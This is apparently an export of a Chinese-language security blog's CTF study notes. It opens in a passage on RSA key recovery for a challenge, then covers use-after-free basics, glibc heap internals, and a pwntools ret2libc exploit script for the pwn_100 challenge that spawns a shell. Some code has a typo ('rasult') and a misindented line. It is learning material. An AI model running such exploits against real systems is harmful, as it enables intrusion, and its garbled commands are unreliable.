range(len(c)-1):</span><br><span class="line">flag+=chr(pow(int(c[i]),d,n))</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><img src="/img/RSA2.jpg" alt="avatar"></p><p>这样就得出了flag{13212je2ue28fy71w8u87y31r78eu1e2}</p><h3 id="针对pem和enc文件"><a href="#针对pem和enc文件" class="headerlink" title="针对pem和enc文件"></a>针对pem和enc文件</h3><p>当题目给我们的是pem文件时，我们有两种方法处理它。<br>例子：jarvisoj上的mediumRSA</p><ul><li>利用openssl来进行解密<br>题目给了我们public.pem这个公钥文件，所以要先分解出n和e来<br>使用 openssl rsa -pubin -text -modulus -in public.pem<br><img src="/img/openssl.jpg" alt="avatar"></li></ul><p>n = 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD<br>转化成十进制<br>n = 87924348264132406875276140514499937145050893665602592992418171647042491658461<br>e = 65537<br>直接在线网站分解得出：<br>rsa.p = 275127860351348928173285174381581152299<br>rsa.q = 319576316814478949870590164193048041239<br>这样就可以直接用脚本写出私钥文件了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line">rsa = RSA.generate(1024)</span><br><span class="line">rsa.p = 275127860351348928173285174381581152299</span><br><span class="line">rsa.q = 319576316814478949870590164193048041239</span><br><span class="line">rsa.e = 65537</span><br><span class="line">rsa.n = rsa.p*rsa.q</span><br><span class="line">phi = (rsa.p-1)*(rsa.q-1)</span><br><span class="line">i = 1</span><br><span class="line">while (True):</span><br><span class="line">    x = (phi * i ) + 1</span><br><span class="line">    if (x % rsa.e == 0):</span><br><span class="line">        rsa.d = x / rsa.e</span><br><span class="line">break</span><br><span class="line">    i += 1</span><br><span class="line">    </span><br><span class="line">print rsa.d</span><br><span class="line">private = open(&apos;private.pem&apos;,&apos;w&apos;)</span><br><span class="line">private.write(rsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>脚本运行之后生成了一个private.pem的私钥文件<br>使用命令：openssl rasult -in flag.enc -inkey private.pem -out flag.dec<br>得到flag：PCTF{256b_i5_m3dium}</p><ul><li>公钥分析的步骤还可以利用python的RSA库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;./tmp/pubkey.pem&apos;, &apos;r&apos;) as f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br></pre></td></tr></table></figure></li></ul><p>这次就先写这些吧，还是一个小菜鸡，要多学习学习。准备整理一下RSA攻击的各种方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>use after free的学习</title>
      <link href="/2019/07/31/use-after-free%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/07/31/use-after-free%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>初学堆的漏洞利用，就从最简单的Use After Free来学习吧！</p><a id="more"></a><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>其实uaf漏洞的利用跟chunk，bin等heap的内部操作没有什么关系<br>让程序有两个指针指向同一个记忆体</p><ul><li>一个是structure，另一块用作data buffer</li><li>利用对buffer的读写，修改或泄露structure的内容</li></ul><p>总的来说就是利用chunk的回收特性<br>所谓use after free,是指free(=p)掉后还继续使用它</p><ul><li>例：linked list remove掉物件后，忘了把指向它的指针清为NULL，导致以为该物件还存在list当中。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用LibcSearcher解题</title>
      <link href="/2019/07/27/%E4%BD%BF%E7%94%A8LibcSearcher%E8%A7%A3%E9%A2%98/"/>
      <url>/2019/07/27/%E4%BD%BF%E7%94%A8LibcSearcher%E8%A7%A3%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>我们都知道，很多时候，我们做pwn题出题者是不会给我们libc文件的，这时候，我们就需要通过各种方法来获得libc的版本，libc的基址等。这时候我们首先想到的就是泄露一个函数的真实地址。这时候，我们就可以来查找我们需要的libc版本以及偏移。在以前，获取一个函数地址之后我们就可以在libc.database网站上直接查找libc版本等信息，但现在这个网站好像不行了，所以我们现在只能通过LibcSearcher库或者pwntools的DynELF来做题。</p><a id="more"></a><h2 id="LibcSearcher的基本用法"><a href="#LibcSearcher的基本用法" class="headerlink" title="LibcSearcher的基本用法"></a>LibcSearcher的基本用法</h2><p>LibcSearcher库的使用方法是非常简单的，只需要我们泄露出一个函数的真实地址之后，就可以利用这个库自带的工具来得出offset<br>了。具体代码大体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr) </span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;) //算出libc基地址</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)   //算出各函数的真实地址</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br></pre></td></tr></table></figure><h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><p>这里我们用攻防世界中的pwn_100这道题来实操一下。<br>这道题是一道非常基础的栈溢出题，是一个64位程序，开启了nx防护。<br>用ida看一下源码<br><img src="/img/pwn_100_1.jpg" alt="avatar"><br><img src="/img/pwn_100_2.jpg" alt="avatar"><br>从这里很容易找出栈溢出漏洞。直接给出脚本吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">pop_rsi = 0x400761</span><br><span class="line">start = 0x400550</span><br><span class="line">payload = &apos;a&apos;*0x48+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">payload = payload.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;~\n&apos;)</span><br><span class="line">putsaddr=u64(p.recv()[-7:-1].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(putsaddr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr)</span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1 = &apos;a&apos;*0x47 + p64(pop_rdi)+p64(bins)+p64(system)+p64(0xdeadbeef).ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">#print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这样就十分好理解LibcSearcher这个工具了吧，功能强大，使用方便。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap-1</title>
      <link href="/2019/07/21/heap-1/"/>
      <url>/2019/07/21/heap-1/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正式开始学习heap的第一天，简单的在自己的博客里记录一下，当做自己的学习笔记。</p><a id="more"></a><p>各式命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ltrace -e &apos;malloc+free+&apos; ./heap  //可用来查看地址等内容</span><br><span class="line">p/x *(struct malloc_chunk*)0x602000 //gdb中以chunk的格式查看chunk里的内容</span><br><span class="line">p main_arena // 查看main_arena内容</span><br><span class="line">x/40gx 0x602000 //查看堆中内容</span><br></pre></td></tr></table></figure><ul><li>在linux的堆学习中，我们主要学习的就是malloc，relloc和free三个函数。</li><li>要知道：<br>  有哪些位置的记忆体是可以被分配的<br>  有哪些是因为被free掉而可以被回收的<br>  有哪些是使用中不需要记录，使用他们的人应该记住这些指标（heap本身并不会记录）</li><li>整个heap的资料记录在一个struct malloc_state中，名为main_arena<br>malloc分配的记忆体名为chunk，会比要求的大小要大一点，因为需要记录一些额外的data<br>Arena跟heap分配的记忆体分开存放，heap overflow没办法直接覆盖掉他的内容</li><li>回收的chunk用linked list记录，名为bin</li><li>main_arena中有很多bin，每个bin里储存的chunk size不同，目的是让malloc时可以尽快找到最适合大小的chunk</li><li>回收的chunk会依据size来决定应该放哪个linked list(bin)中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">bin[0](size = 16) -&gt; chunk1 -&gt; chunk5</span><br><span class="line">bin[1](size = 32) -&gt; chunk2 -&gt; chunk3 -&gt; chunk4</span><br><span class="line">bin[2](size = 48) -&gt; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h2><p>然后我们可以自己编写一个heap.c来看heap的操作会发生什么事情。<br>首先我们进入gdb进行调试，将断点断在main，跑起来，输入p main_arena 就可以看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$1 = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x0, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7ffff7dd1b20 &lt;main_arena&gt;, </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x0, </span><br><span class="line">  max_system_mem = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们可以使用p main_arena.bins [0]命令来查看bin[0]的内容，同时通过vmmap命令可以看到，在本程序中heap的起始位置<br>在0x602000，使用x/40gx 0x602000就可以查看堆中的内容了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x602000:0x00000000000000000x00000000000000a1</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br><span class="line">0x602060:0x00000000000000000x0000000000000000</span><br><span class="line">0x602070:0x00000000000000000x0000000000000000</span><br><span class="line">0x602080:0x00000000000000000x0000000000000000</span><br><span class="line">0x602090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020a0:0x00000000000000000x00000000000000a1</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x602100:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110:0x00000000000000000x0000000000000000</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>这就是两个chunk的内容，之后还会提到<strong>top chunk</strong>的内容，以后再学习吧。</p><h2 id="chunk的知识"><a href="#chunk的知识" class="headerlink" title="chunk的知识"></a>chunk的知识</h2><p>存放chunk metadata的chunk结构(header):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk&#123;</span><br><span class="line">size_t prev_size;</span><br><span class="line">size_t size;</span><br><span class="line">malloc_chunk* fd;//当chunk处于inuse状态的时候fd和bk是不需要的，就用来放userdata</span><br><span class="line">malloc_chunk* bk;</span><br><span class="line">malloc_chunk* fd_nextsize;</span><br><span class="line">malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(64bit):mem = malloc(size)<br>-&gt; chunk = mem - 16(32bit则是8);chunksize = (size+8)#16 </p><ul><li>实际chunk地址是malloc得到的地址减去16</li><li>chunksize是size+8后向上对齐到16的倍数，因为要存放额外的资料</li></ul><p>下面我们看一看chunk在被使用的条件之下，结构是什么样子的。<br><img src="/img/inuse.jpg" alt="avatar"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">void *p,*q;</span><br><span class="line">p = malloc(152);</span><br><span class="line">q = malloc(10);</span><br><span class="line">memset(p,&apos;A&apos;,152);</span><br><span class="line">free(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在如上代码的情况下，我们输入x/36gx 0x602000查看堆中布局，会看到如下代码：<br><img src="/img/chunk.jpg" alt="avatar"><br>从这里我们就可以知道，为什么chunksize需要+8，因为我们可以覆盖到下一个chunk的前8个bit<br>再看not inuse时的情况：<br><img src="/img/noinuse.jpg" alt="avatar"><br>在把p释放掉以后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/36gx 0x602000</span><br><span class="line">0x602000:0x00000000000000000x00000000000000a1</span><br><span class="line">0x602010:0x00007ffff7dd1b780x00007ffff7dd1b78//fd和bk</span><br><span class="line">0x602020:0x41414141414141410x4141414141414141</span><br><span class="line">0x602030:0x41414141414141410x4141414141414141</span><br><span class="line">0x602040:0x41414141414141410x4141414141414141</span><br><span class="line">0x602050:0x41414141414141410x4141414141414141</span><br><span class="line">0x602060:0x41414141414141410x4141414141414141</span><br><span class="line">0x602070:0x41414141414141410x4141414141414141</span><br><span class="line">0x602080:0x41414141414141410x4141414141414141</span><br><span class="line">0x602090:0x41414141414141410x4141414141414141</span><br><span class="line">0x6020a0:0x00000000000000a00x0000000000000020//这里a0就是prev_size，如果我这个chunk正在使用，就不需要</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0:0x00000000000000000x0000000000020f41</span><br><span class="line">0x6020d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="chunk的栏位"><a href="#chunk的栏位" class="headerlink" title="chunk的栏位"></a>chunk的栏位</h3><ul><li>size:这个chunk在记忆体里的大小</li><li>fd，bk：指向bin里前一、后一个chunk(一般来说，bin是double linked list)</li><li>prev_size：前一个chunk的size，</li></ul><p>这种情况之下，每个chunk可以看到相邻的4个chunk：</p><ul><li>下一个chunk是chunk+size</li><li>前一个chunk是chunk-prev_size</li></ul><h3 id="size的栏位"><a href="#size的栏位" class="headerlink" title="size的栏位"></a>size的栏位</h3><p>size栏位包含chunk size和flag bits<br>chunk size最低三个bit有flag的作用</p><ul><li>fastbin&lt;= </li><li>smallbin&lt;1024</li><li>largebin</li><li>mmap&gt;=0x20000</li></ul><p>最低的bit为prev_inuse bit,用来表示前一个chunk是不是被使用</p><ul><li>free会使得下个个chunk的prev_inuse bit 被设为0</li></ul><p>在上面那个实例当中，当我们free(p)之后，我们会发现，q的size的最后一位变成了0，这就代表p not_inise</p><h2 id="heap的操作"><a href="#heap的操作" class="headerlink" title="heap的操作"></a>heap的操作</h2><p>p = malloc(size)</p><ul><li>找出一个可用的chunk，或者从top chunk上切下来一块</li><li>如果这个chunk是回收的，要先从bin中unlink，即移出linked list</li><li>填好结构，并回传chunk+16</li></ul><p>free(p)</p><ul><li>检查一下该chunk前后的chunk是不是not inuse</li><li>如果有，则这些回收的记忆体可以被合并成一块</li><li>合并成新的chunk，放进对应的bin中</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
